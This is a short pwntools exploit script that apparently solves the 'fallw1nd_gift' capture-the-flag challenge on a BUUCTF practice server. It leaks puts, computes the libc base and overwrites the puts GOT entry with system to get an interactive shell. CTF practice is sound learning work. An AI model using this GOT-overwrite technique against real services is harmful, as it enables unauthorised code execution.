from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29776)
elf = ELF('./fallw1nd_gift')
io.recvuntil(b'fallw1nd says you are the best pwnner,he will give you a gift as reward:\n')
puts_addr = int(io.recvline()[:-1], 16)
log.info('puts_address => %#x' % puts_addr)
io.recvuntil(b'now input your addr:\n')
puts_got = elf.got['puts']
io.sendline(hex(puts_got))
libc = ELF('./libc-2.31.so')
libcbase = puts_addr - libc.symbols['puts']
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.symbols['system']
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = 0x402082
payload = p64(system_addr)
io.sendlineafter(b'now input your content:', payload)
io.interactive()